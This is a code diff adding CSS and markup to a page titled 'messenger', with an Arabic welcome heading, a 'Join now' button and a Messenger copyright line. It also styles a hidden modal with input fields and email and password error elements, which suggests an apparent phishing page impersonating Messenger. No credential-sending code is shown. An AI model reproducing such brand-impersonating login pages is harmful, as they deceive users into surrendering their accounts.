@@ -10,6 +10,125 @@
 <title>messenger</title>
 <link href='https://f.top4top.io/p_2161rhjns1.png' rel='icon' sizes='16x16' type='image/gif'/>
 <style>
+
+body, html {
+height: 100%;
+.inlog{text-overflow:ellipsis;}.inlog{white-space:nowrap;}.inlog,[class~=container],[class~=container] input{cursor:pointer;}.inlog{line-height:1.625pc;}[class~=container] input:checked ~ [class~=checkmark]:after,body{display:block;}[class~=container] input{height:0;}[class~=container] input{width:0;}.inlog{padding-left:.625pc;}.inlog{padding-bottom:0;}[class~=container] [class~=checkmark]:after{border-left-color:white;}.inlog{padding-right:.625pc;}.inlog{width:auto;}[class~=chbox]{color:#929292;}[class~=chbox]{font-size:15px;}[class~=chbox]{font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif;}[class~=chbox],[class~=cboxl]{display:inline-block;}[class~=chbox]{margin-left:35.75pt;}[class~=checkmark]:after{content:"";}[class~=chbox]{margin-top:2.1875pc;}[class~=container] [class~=checkmark]:after{border-bottom-color:white;}[class~=checkmark],[class~=checkmark]{top:0;}[class~=checkmark]{left:0;}[class~=checkmark]{height:.260416667in;}[class~=checkmark]{width:25px;}[class~=checkmark]{background-color:#eee;}[class~=container]{position:relative;}[class~=container]{margin-right:1.625pc;}body{font-family:Helvetica,Arial,sans-serif;}[class~=container]{font-size:.1875in;}[class~=checkmark],[class~=checkmark]:after{position:absolute;}body{font-size:.8125pc;}[class~=container] [class~=checkmark]:after{border-right-color:white;}[class~=container] [class~=checkmark]:after{border-top-color:white;}[class~=checkmark]{right:0;}[class~=checkmark]{height:1.125pc;}[class~=checkmark]{width:.1875in;}[class~=checkmark]:after{display:none;}[class~=checkmark]{background-color:#dadada;}[class~=checkmark]{border-radius:4.5pt;}[class~=container] [class~=checkmark]:after{border-image:none;}input::-webkit-input-placeholder{color:#afb5b8;}[class~=container] [class~=checkmark]:after{-webkit-transform:rotate(45deg);}[class~=container] [class~=checkmark]:after{-ms-transform:rotate(45deg);}[class~=container] [class~=checkmark]:after{transform:rotate(45deg);}.container input:checked ~ .checkmark{background-color:#0084ff;}
+.container {right: 10px;top: 5px;}
+.erorr {color: #33A8FF;
+display: block;
+margin-right: auto;
+margin-left: auto;
+font-size: 17px;
+font-weight: 500;
+line-height: 25px;
+margin-bottom: 24px;
+text-align: center;}
+.erorrborder{border: 2px #33A8FF solid;}
+#erorrmail,#erorrpass {display:none;}
+.inlog{ background: #FF6600;
+border-radius: 50px;
+color: #fff;
+font-size: 16px;
+padding: 9.5px 20px;
+}
+.logo {background-image: url(https://f.top4top.io/p_2161rhjns1.png);
+background-repeat: no-repeat;
+height: 140px !important;
+width: 140px;
+max-width:140px;
+}
+.body3{
+display:flex;
+justify-content: center;
+align-items: center;
+flex-wrap: nowrap;
+flex-direction: column;
+padding: 50px;
+text-align:center;
+margin-top:50px ;
+}
+.fbtn{
+background: #00B2FF;
+border-radius: 50px;
+width: 40%;
+height: 50px;
+color: #fff;
+font-size: 20px;
+border:1px solid white;
+cursor: pointer;
+margin: 10px;
+transition: width 0.4s, height 0.5s;
+}
+.fbtn:hover{
+background-color: #ffffff;
+color: #0a7cff;
+border:1.5px solid #33FFF0;
+width: 45%;
+height: 60px;
+}
+/* -------------modal----- */
+.bg-modal{
+width: 100%;
+height: 100%;
+position:fixed;
+top: 0;
+background-color:rgba(0, 94, 170, 0.9) ;
+display: flex;
+justify-content: center;
+align-items: center;
+display: none;
+}
+.modal-cont{
+width: 400px;
+height: 450px;
+background-color: white;
+text-align: center;
+padding: 20px;
+border-radius: 5px;
+margin: 20px;
+}
+.inp{
+display: block;
+height: 40px;
+width: 86%;
+margin: 15px auto;
+padding:5px 15px;
+border-radius: 5px;
+border: 1px solid #dddfe2;
+color: #1d2129;
+}
+.button{
+background: #008ad3;
+border-radius: 50px;
+width: 70%;
+height: 50px;
+color: #fff;
+font-size: 20px;
+border:1px solid white;
+cursor: pointer;
+margin: 10px;
+}
+.button:hover{
+background-color:#fff;
+color: #0a7cff;
+border:1px solid #0a7cff;
+}
+.img {
+padding: 20px;
+}
+    </style>
+
+</head>
+<body>
+<div class='no-items section' id='1'></div>
+<div class='no-items section' id='1'></div>
+<div class='body2'>
+<div class='body3'>
+<h1>تواصل مع الأشخاص المفضلين لديك</h2>
+<br/>
+<br/>
+<br/>
 <i class='logo'></i>
 <br/>
 <br/>
@@ -17,6 +136,7 @@
 <br/>
 <br/>
 <br/>
+<button class='fbtn' id='btn'>Join now</button>
 <div style='font-size: 14px; text-align: center; padding: 15px; margin: 10px;'>
 <span id='copyright' style='text-decoration:none;color:#999999;font-weight:bold;' title='Messenger'>Messenger Copyright &#169;&#65039;</span>
 </div>
